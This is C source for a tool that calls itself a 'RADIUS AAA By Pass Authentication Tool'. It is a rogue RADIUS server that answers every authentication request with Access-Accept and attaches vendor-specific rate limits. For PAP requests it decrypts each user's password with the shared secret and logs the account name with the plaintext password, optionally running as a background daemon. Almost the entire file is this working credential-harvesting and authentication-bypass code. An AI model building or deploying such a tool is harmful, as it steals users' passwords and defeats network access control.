#include <fcntl.h>
#include <stdio.h>
#include <errno.h>
#include <stdlib.h>
#include <dirent.h>
#include <unistd.h>
#include <string.h>
#include <pthread.h>
#include <sys/epoll.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>

#include "md5.h"
#include "log.h"
#include "argparse.h"
#include "radius.h"

#define PACKET_SIZE 4096
#define MAX_PKT_NUM 256
#define MAX_THREAD_NUM 8

threadpool*	thread_pool=NULL;
char*		auth_secret;
FILE*		logfile=NULL;
int		seqnum[MAX_THREAD_NUM];
uint32_t	uplimit,downlimit;
uint32_t	session_online=0;

void* thread_routine(void* num){
	threadwork* task;
	while(1){
		pthread_mutex_lock(&thread_pool->queue_lock);
		while(thread_pool->queue_head==NULL){
			pthread_cond_wait(&thread_pool->queue_cond,&thread_pool->queue_lock);
		}
		task=thread_pool->queue_head;
		thread_pool->queue_head=task->next;
		pthread_mutex_unlock(&thread_pool->queue_lock);
		task->fun(task->arg);
		free(((workdata*)task->arg)->data);
		free((workdata*)task->arg);
		free(task);
	}
	return NULL;
}
int threadpool_addwork(void*(*fun)(void*),void* arg){
	if(!fun){
		log_debug("%s:添加任务时函数指针错误!", __FUNCTION__);
		return -1;
	}
	threadwork* work = malloc(sizeof(threadwork));
	if(work==NULL){
		log_debug("%s:添加任务时申请内存失败!", __FUNCTION__);
		return -1;
	}
	work->fun = fun;
	work->arg = arg;
	work->next = NULL;
	pthread_mutex_lock(&thread_pool->queue_lock);
	if(thread_pool->queue_head == NULL){
		thread_pool->queue_head = work;
		thread_pool->queue_tail = work;
	}else{
		thread_pool->queue_tail->next=work;
		thread_pool->queue_tail=work;
	}
	pthread_mutex_unlock(&thread_pool->queue_lock);
	pthread_cond_signal(&thread_pool->queue_cond);
	return 0;
}
int threadpool_create(int num){
	thread_pool=calloc(1,sizeof(threadpool));
	if(thread_pool==NULL){
		log_debug("给线程池结构申请内存失败:%s",__FUNCTION__);
		return -1;
	}
	thread_pool->thread_num = num;
	thread_pool->queue_head = NULL;
	thread_pool->queue_tail = NULL;
	if(pthread_mutex_init(&thread_pool->queue_lock, NULL)!=0){
		log_debug("线程互斥锁初始化失败:%s",__FUNCTION__);
		return -1;
	}
	if(pthread_cond_init(&thread_pool->queue_cond,NULL)!=0){
		log_debug("线程条件变量初始化失败:%s",__FUNCTION__);
		return -1;
	}
	thread_pool->thread_id=calloc(num,sizeof(pthread_t));
	if(!thread_pool->thread_id){
		log_debug("给线程ID数组申请内存失败:%s",__FUNCTION__);
		return -1;
	}
	int i;
	for(i=0;i<num;++i){
		seqnum[i]=i;
		if(pthread_create(&thread_pool->thread_id[i],NULL,&thread_routine,&seqnum[i])!=0){
			log_debug("线程池启动失败:%s,编号:%d,描述:%s",__FUNCTION__,errno,strerror(errno));
			return -1;
		}
	}
	return 0;
}
void setnonblocking(int sock){
	int opts;
	opts=fcntl(sock,F_GETFL);
	if(opts<0){
		perror("获取套接字状态标志错误");
		exit(-1);
	}
	opts = opts|O_NONBLOCK;
	if(fcntl(sock,F_SETFL,opts)<0){
		perror("设置套接字状态标志错误");
		exit(-1);
	}
}
int getpath(char* path){
	strncpy(path,"/root/",7);
	return 1;
}
int main(int argc,const char** argv){
	int i,AUTH_PORT=1812;
	int auth_fd;
	struct sockaddr_in auth_sock;
	char workdir[256];
	int pid;
	bool daemon_flag=false;
	if(getpath(workdir)<0){
		log_debug("获取程序工作目录失败!");
		exit(-1);
	}
	if(chdir(workdir)<0){
		log_debug("切换程序工作目录失败:%s",workdir);
		exit(-1);
	}
	static const char *const usages[] = {
		"\nDaemon Mode:radiusbypass -p 1812 -s 123456 -u 1536 -d 10240 -t 86400 -f logfile.txt -D",
		"\nConsole Mode:radiusbypass -p 1812 -s 123456 -u 1536 -d 10240 -t 86400 -f logfile.txt",
		NULL,
	};
	int D=0,p=0,u=0,d=0,t=0;
	const char *s,*f;
	struct argparse_option options[]={
		OPT_HELP(),
		OPT_BOOLEAN('D',"daemon",&D,"Daemon Mode",NULL,0,0),
		OPT_INTEGER('p',"port",&p,"Listen Port",NULL,0,0),
		OPT_INTEGER('u',"uplimit",&u,"Upload Limit",NULL,0,0),
		OPT_INTEGER('d',"downlimit",&d,"Down Limit",NULL,0,0),
		OPT_INTEGER('t',"session_simeout",&t,"Session Timeout",NULL,0,0),
		OPT_STRING('s',"secret",&s,"Auth Secret",NULL,0,0),
		OPT_STRING('f',"logfile",&f,"LOG FILE",NULL,0,0),
		OPT_END(),
	};
	struct argparse argparse;
	argparse_init(&argparse, options, usages, 0);
	argparse_describe(&argparse, "", "\nRADIUS AAA By Pass Authentication Tool.\n");
	argc=argparse_parse(&argparse, argc, argv);
	if(D>0)
		daemon_flag=true;
	if(p>0)
		AUTH_PORT=p;
	if(t>0)
		session_online=htonl(t);
	if(u>0)
		uplimit=u;
	if(d>0)
		downlimit=d;
	if(strlen(s)>0)
		auth_secret=(char*)s;
	if(daemon_flag==true){
		if((pid=fork())>0){
			exit(0);
		}else if(pid==0){
			setsid();
			if(strlen(f)>0){
				if((logfile=fopen(f,"w+"))==NULL){
					log_debug("打开密码记录文件失败:%s",f);
					exit(-1);
				}
				log_set_fp(logfile);
				log_set_quiet(1);
			}
		}else if(pid<0){
			log_debug("守护进程初始化失败!");
			exit(-1);
		}
	}
	auth_fd=socket(AF_INET,SOCK_DGRAM,0);
	memset(&auth_sock,'\0',sizeof(auth_sock));
	auth_sock.sin_family=AF_INET;
	auth_sock.sin_port=htons(AUTH_PORT);
	auth_sock.sin_addr.s_addr = htonl(INADDR_ANY);
	if(bind(auth_fd,(struct sockaddr*)&auth_sock,sizeof(auth_sock))<0){
		log_debug("认证端口初始化错误!");
		exit(-1);
	}
	if(threadpool_create(MAX_THREAD_NUM)<0){
		log_debug("创建线程池失败");
		exit(-1);
	}
	setnonblocking(auth_fd);
	struct epoll_event auth_epev,event[MAX_PKT_NUM];
	int epoll=epoll_create(MAX_PKT_NUM);
	if(epoll<1){
		log_debug("EPOLL I/O复用接口初始化失败");
		exit(-1);
	}
	auth_epev.data.fd=auth_fd;
	auth_epev.events=EPOLLIN | EPOLLET;
	if(epoll_ctl(epoll,EPOLL_CTL_ADD,auth_fd,&auth_epev)<0){
		log_debug("EPOLL I/O复用接口注册认证套接字事件失败");
		exit(-1);
	}
	int pkt_num,auth_pkt_len;
	struct sockaddr_in auth_client;
	socklen_t addr_len=sizeof(struct sockaddr_in);
	while(1){
		pkt_num=epoll_wait(epoll,event,MAX_PKT_NUM,-1);
		if(pkt_num<=0)continue;
		for(i=0;i<pkt_num;++i){
			if(event[i].data.fd==auth_fd){
				void* auth_buff=malloc(4096);
				auth_pkt_len=recvfrom(auth_fd,auth_buff,PACKET_SIZE,0,(struct sockaddr*)&auth_client,&addr_len);
				if(auth_pkt_len<24||auth_pkt_len>4096)continue;
				struct workdata* auth_data=malloc(sizeof(struct workdata));
				auth_data->data=auth_buff;
				auth_data->len=auth_pkt_len;
				auth_data->socket=auth_fd;
				auth_data->client=auth_client;
				threadpool_addwork(auth_fun,(void*)auth_data);
			}
		}
		continue;
	}
	fclose(logfile);
}
void* auth_fun(void* arg){
	workdata* pkt_data=arg;
	rad_head* radhead=pkt_data->data;
	radhead->length=ntohs(radhead->length);
	if(radhead->code!=Access_Request){
		log_debug("认证请求包第一个字节非法：%d",radhead->code);
		return NULL;
	}
	if(radhead->length!=pkt_data->len){
		log_debug("RADIUS头部长度域不等于接收包长度：%d_%d",radhead->length,pkt_data->len);
		return NULL;
	}
	rad_attr* radattr=decode_attr(radhead->length-RADIUS_HEAD_LEN,pkt_data->data+RADIUS_HEAD_LEN);
	if(radattr==NULL){
		log_debug("格式化属性域数据出错!");
		return NULL;
	}
	int auth_type=check_auth_type(radattr);
	if(auth_type<1||auth_type>4){
		log_debug("未知的密码校验类型!");
		free_attrlist(radattr);
		return NULL;
	}
	rad_attr* uname_attr=find_attr(RFC,User_Name,radattr);
	if(uname_attr==NULL||*(uname_attr->length)<0){
		log_debug("RADIUS数据包中不含用户名属性!");
		free_attrlist(radattr);
		return NULL;
	}
	rad_attr* pap_password=find_attr(RFC,User_Password,radattr);
	if(auth_type==1&&pap_password){
		uint8_t password[128];
		char username[64];
		memset(password,0,128);
		snprintf(username,(*uname_attr->length)-1,"%s",uname_attr->value);
		pap_dec((uint8_t*)auth_secret,strlen(auth_secret),radhead->auth,pap_password->value,(*pap_password->length)-2,password);
		log_info("账号:%s\t密码:%s",username,password);
	}
	send_auth_reply(radhead->id,radhead->auth,auth_secret,uname_attr,pkt_data->socket,pkt_data->client);
	free_attrlist(radattr);
	return NULL;
}
void send_auth_reply(uint8_t id,uint8_t* auth,char* secret,rad_attr* uname_attr,int socket,struct sockaddr_in client){
	rad_head replyhead;
	replyhead.code=Access_Accept;
	replyhead.id=id;
	memcpy(((char*)&replyhead)+4,auth,16);
	int SECRET_LEN=strlen(secret);
	uint8_t replyattr[1024];
	int ATTR_LEN=build_reply_attr(replyattr,uname_attr);
	replyhead.length=htons(RADIUS_HEAD_LEN+ATTR_LEN);
	uint8_t auth_tmp[RADIUS_HEAD_LEN+ATTR_LEN];
	memcpy(auth_tmp,&replyhead,RADIUS_HEAD_LEN);
	memcpy(auth_tmp+RADIUS_HEAD_LEN,replyattr,ATTR_LEN);
	memcpy(auth_tmp+RADIUS_HEAD_LEN+ATTR_LEN,secret,SECRET_LEN);
	uint8_t md5_auth[16];
	md5(md5_auth,auth_tmp,RADIUS_HEAD_LEN+ATTR_LEN+SECRET_LEN);
	memcpy(auth_tmp+4,md5_auth,16);
	sendto(socket,auth_tmp,RADIUS_HEAD_LEN+ATTR_LEN,0,(struct sockaddr*)&client,sizeof(struct sockaddr_in));
}
int build_reply_attr(uint8_t* buffer,rad_attr* uname_attr){
	int len=0,i;
	uint32_t uplimitstr,downlimitstr;
	buffer[0]=User_Name;
	buffer[1]=*uname_attr->length;
	memcpy(buffer+2,uname_attr->value,(*uname_attr->length)-2);
	len+=*uname_attr->length;
	buffer[len]=Session_Timeout;
	buffer[len+1]=6;
	memcpy(buffer+len+2,&session_online,4);
	len+=6;
	uint8_t unamemd5bin[16];
	char unamemd5str[32];
	md5(unamemd5bin,uname_attr->value,(*uname_attr->length)-2);
	for(i=0;i<16;i++){
		sprintf(unamemd5str+(2*i),"%02x",unamemd5bin[i]);
	}
	buffer[len]=Class;
	buffer[len+1]=34;
	memcpy(buffer+len+2,&unamemd5str,32);
	len+=34;
	buffer[len]=Vendor_Specific;
	uint32_t Mikrotik=htonl(MIKROTIK);
	memcpy(buffer+len+2,&Mikrotik,4);
	buffer[len+RADIUS_26_HEAD_LEN]=Mikrotik_Rate_Limit;
	char speedlimit[32];
	snprintf(speedlimit,32,"%d/%d",uplimit*8*1000,downlimit*8*1000);
	buffer[len+RADIUS_26_HEAD_LEN+1]=strlen(speedlimit)+2;
	memcpy(buffer+len+RADIUS_26_HEAD_LEN+2,speedlimit,strlen(speedlimit));
	buffer[len+1]=strlen(speedlimit)+RADIUS_26_HEAD_LEN+2;
	len+=buffer[len+1];
	uplimitstr=htonl(uplimit);
	buffer[len]=Vendor_Specific;
	buffer[len+1]=12;
	uint32_t RoaringPenguin=htonl(Roaring_Penguin);
	memcpy(buffer+len+2,&RoaringPenguin,4);
	buffer[len+RADIUS_26_HEAD_LEN]=RP_Upstream_Speed_Limit;
	buffer[len+RADIUS_26_HEAD_LEN+1]=6;
	memcpy(buffer+len+RADIUS_26_HEAD_LEN+2,&uplimitstr,4);
	len+=12;
	downlimitstr=htonl(downlimit);
	buffer[len]=Vendor_Specific;
	buffer[len+1]=12;
	memcpy(buffer+len+2,&RoaringPenguin,4);
	buffer[len+RADIUS_26_HEAD_LEN]=RP_Downstream_Speed_Limit;
	buffer[len+RADIUS_26_HEAD_LEN+1]=6;
	memcpy(buffer+len+RADIUS_26_HEAD_LEN+2,&downlimitstr,4);
	len+=12;
	uplimitstr=htonl(uplimit*1024*8);
	buffer[len]=Vendor_Specific;
	buffer[len+1]=12;
	uint32_t Huawei=htonl(HUAWEI);
	memcpy(buffer+len+2,&Huawei,4);
	buffer[len+RADIUS_26_HEAD_LEN]=Huawei_Input_Average_Rate;
	buffer[len+RADIUS_26_HEAD_LEN+1]=6;
	memcpy(buffer+len+RADIUS_26_HEAD_LEN+2,&uplimitstr,4);
	len+=12;
	downlimitstr=htonl(downlimit*1024*8);
	buffer[len]=Vendor_Specific;
	buffer[len+1]=12;
	memcpy(buffer+len+2,&Huawei,4);
	buffer[len+RADIUS_26_HEAD_LEN]=Huawei_Output_Average_Rate;
	buffer[len+RADIUS_26_HEAD_LEN+1]=6;
	memcpy(buffer+len+RADIUS_26_HEAD_LEN+2,&downlimitstr,4);
	len+=12;
	return len;
}
void pap_dec(uint8_t* secret,uint8_t secret_len,uint8_t* auth,uint8_t* pap_pwd,uint8_t pwd_len,uint8_t* pwd_text){
	int loop=pwd_len/16;
	int i,j,offset;
	uint8_t	group[16];
	uint8_t md5val[16];
	uint8_t md5source[secret_len+16];
	memcpy(md5source,secret,secret_len);
	for(i=1;i<=loop;i++){
		offset=(loop-i)*16;
		memcpy(group,pap_pwd+offset,16);
		if(loop==i){
			memcpy(md5source+secret_len,auth,16);
			md5(md5val,md5source,secret_len+16);
			for(j=0;j<16;++j){
				pwd_text[j]=group[j]^md5val[j];
			}
		}else{
			memcpy(md5source+secret_len,pap_pwd+offset-16,16);
			md5(md5val,md5source,secret_len+16);
			for(j=0;j<16;++j){
				pwd_text[offset+j]=group[j]^md5val[j];
			}
		}
	}
}
rad_attr* decode_attr(int length,rad_attr* data){
	rad_attr* attr_list=NULL;
	rad_attr* attr_next=NULL;
	int vendor=0;
	int len=0;
	while(*(((char*)data)+len+1)>2&&*(((char*)data)+len+1)+len<=length&&*(((char*)data)+len+1)<254){
		if(*((char*)data+len)==26){
			vendor=htonl(*(uint32_t*)((char*)data+len+2));
			len+=RADIUS_26_HEAD_LEN;
			continue;
		}
		rad_attr* attr_tmp=calloc(1,sizeof(rad_attr));
		attr_tmp->vendor=vendor;
		vendor=0;
		attr_tmp->code=(uint8_t*)data+len;
		attr_tmp->length=attr_tmp->code+1;
		attr_tmp->value=attr_tmp->length+1;
		attr_tmp->next=NULL;
		if(attr_list!=NULL){
			attr_next->next=attr_tmp;
			attr_next=attr_tmp;
		}else{
			attr_list=attr_tmp;
			attr_next=attr_tmp;
		}
		len+=*attr_tmp->length;
	}
	return attr_list;
}
void free_attrlist(rad_attr* attrlist){
	rad_attr* attr_tmp;
	while(attrlist!=NULL){
		attr_tmp=attrlist->next;
		free(attrlist);
		attrlist=attr_tmp;
	}
}
rad_attr* find_attr(int vendor,uint8_t code,rad_attr* attr_list){
	while(attr_list!=NULL){
		if(attr_list->vendor==vendor && *(attr_list->code)==code){
			return attr_list;
		}
		attr_list=attr_list->next;
	}
	return NULL;
}
int check_auth_type(rad_attr* attrlist){
	int i=0;
	if(find_attr(RFC,User_Password,attrlist)!=NULL){
		i=1;
	}else if(find_attr(RFC,CHAP_Password,attrlist)!=NULL){
		i=2;
	}else if(find_attr(MICROSOFT,MS_CHAP_Response,attrlist)!=NULL&&find_attr(MICROSOFT,MS_CHAP_Challenge,attrlist)!=NULL){ 
		i=3;
	}else if(find_attr(MICROSOFT,MS_CHAP2_Response,attrlist)!=NULL&&find_attr(MICROSOFT,MS_CHAP_Challenge,attrlist)!=NULL){
		i=4;
	}
	return i;
}
